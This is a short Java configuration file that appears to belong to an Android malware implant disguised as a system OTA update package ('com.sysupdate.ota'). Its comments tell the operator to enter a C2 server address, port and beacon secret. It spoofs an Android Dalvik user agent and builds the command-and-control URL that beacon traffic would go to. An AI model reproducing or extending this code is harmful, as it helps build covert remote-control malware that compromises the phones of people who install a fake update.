package com.sysupdate.ota;

public final class Config {
    // Set your C2 server IP/hostname and port here
    public static final String HOST = "YOUR_SERVER_IP";
    public static final int PORT = 8080;
    public static final String PATH = "/api.php";
    // Paste your BEACON_SECRET from .env here
    public static final String SECRET = "YOUR_BEACON_SECRET_HERE";
    public static final String UA = "Dalvik/2.1.0 (Linux; U; Android)";

    public static String baseUrl() {
        return "http://" + HOST + ":" + PORT + PATH;
    }
}
